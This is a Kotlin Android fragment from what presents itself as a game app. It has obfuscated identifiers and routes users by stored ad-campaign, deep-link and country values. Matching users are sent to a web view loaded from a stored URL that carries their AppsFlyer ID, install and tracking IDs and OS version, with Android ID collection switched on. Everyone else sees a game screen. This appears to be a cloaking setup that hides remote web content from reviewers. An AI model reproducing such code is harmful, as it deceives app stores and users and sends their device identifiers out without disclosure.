package com.artifexmundi.bale

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.fragment.app.Fragment
import com.appsflyer.AppsFlyerLib
import com.artifexmundi.bale.cooont.Util26255.yjuujuj
import com.artifexmundi.bale.cooont.Util26255.bghyyhhyhy
import com.artifexmundi.bale.cooont.Util26255.aps_idhyhy2hy
import com.artifexmundi.bale.cooont.Util26255.vfbgthhyhyhy
import com.artifexmundi.bale.cooont.Util26255.hyjjujujujuj
import com.artifexmundi.bale.cooont.Util26255.instIdhyhy
import com.artifexmundi.bale.cooont.Util26255.hhy2hy25u
import com.artifexmundi.bale.cooont.Util26255.frgtgttggt
import com.artifexmundi.bale.cooont.Util26255.myIdhyyh
import com.artifexmundi.bale.cooont.Util26255.nammhy2y6h
import com.artifexmundi.bale.cooont.Util26255.cdvfttyyuu
import com.artifexmundi.bale.cooont.Util26255.paaaackhyyh
import com.artifexmundi.bale.cooont.Util26255.subFivehy
import com.artifexmundi.bale.cooont.Util26255.vfbgbg
import com.artifexmundi.bale.cooont.Util26255.hyhy5hyhy
import com.artifexmundi.bale.cooont.Util26255.subSixyh62hy6
import com.artifexmundi.bale.cooont.Util26255.trololohy
import com.artifexmundi.bale.cooont.Util26255.urlMainhyyhj2u
import com.artifexmundi.bale.gameactiv.GgogogoActivity2
import com.artifexmundi.bale.vebbba.VeeeveevvvActivity2
import org.koin.android.ext.android.inject
import org.koin.core.qualifier.named


class FillloFragment : Fragment() {
    private lateinit var mContext: Context
    val shareP: SharedPreferences by inject(named("SharedPreferences"))

    override fun onAttach(context: Context) {
        super.onAttach(context)
        mContext = context
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        // Inflate the layout for this fragment
        return inflater.inflate(R.layout.fragment_filllo, container, false)
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        val count = shareP.getString(hyjjujujujuj, null)
        val appCamp = shareP.getString("appCamp", null)
        val deepSt = shareP.getString("deepSt", null)
        val countryDev = shareP.getString(vfbgthhyhyhy, null)
        val apps = shareP.getString(bghyyhhyhy, null)
        val wv = shareP.getString(urlMainhyyhj2u, null)
        val mainId = shareP.getString("mainId", null)
        val pack = paaaackhyyh
        val buildVers = Build.VERSION.RELEASE
        val myTrId = shareP.getString(myIdhyyh, null)
        val myInstId: String? = shareP.getString(instIdhyhy, null)

        val intentBeam = Intent(activity, VeeeveevvvActivity2::class.java)
        val intentGame = Intent(activity, GgogogoActivity2::class.java)

        val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(mContext)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)

        shareP.edit().putString(aps_idhyhy2hy, afId).apply()

        Log.d("lolo", "count ${count}")
        Log.d("lolo", "appCamp ${appCamp}")
        Log.d("lolo", "countryDev ${countryDev}")
        Log.d("lolo", "apps ${apps}")

        val linkApps = "$wv$hyhy5hyhy$appCamp&$cdvfttyyuu$afId&$yjuujuj$mainId&$vfbgbg$pack&$subFivehy$buildVers&$subSixyh62hy6$nammhy2y6h"
        val linkMT = "$wv$cdvfttyyuu$myTrId&$yjuujuj$myInstId&$vfbgbg$pack&$subFivehy$buildVers&$subSixyh62hy6$nammhy2y6h"
        val linkFB = "$wv$hyhy5hyhy$deepSt&$cdvfttyyuu$afId&$yjuujuj$mainId&$vfbgbg$pack&$subFivehy$buildVers&$subSixyh62hy6$trololohy"
        val linkFBNullApps = "$wv$hyhy5hyhy$deepSt&$cdvfttyyuu$myTrId&$yjuujuj$myInstId&$vfbgbg$pack&$subFivehy$buildVers&$subSixyh62hy6$trololohy"

        when(apps) {
            "1" ->
                if(appCamp!!.contains(hhy2hy25u)) {
                    shareP.edit().putString(frgtgttggt, linkApps).apply()
                    shareP.edit().putString("WebInt", "campaign").apply()
                    startActivity(intentBeam)
                    activity?.finish()
                } else if (deepSt!=null||countryDev!!.contains(count.toString())) {
                    shareP.edit().putString(frgtgttggt, linkFB).apply()
                    shareP.edit().putString("WebInt", "deepLink").apply()
                    startActivity(intentBeam)
                    activity?.finish()
                } else {
                    startActivity(intentGame)
                    activity?.finish()
                }
            "0" ->
                if(deepSt!=null) {
                    shareP.edit().putString(frgtgttggt, linkFBNullApps).apply()
                    shareP.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(intentBeam)
                    activity?.finish()
                } else if (countryDev!!.contains(count.toString())) {
                    shareP.edit().putString(frgtgttggt, linkMT).apply()
                    shareP.edit().putString("WebInt", "geo").apply()
                    startActivity(intentBeam)
                    activity?.finish()
                } else {
                    startActivity(intentGame)
                    activity?.finish()
                }
        }
    }
}
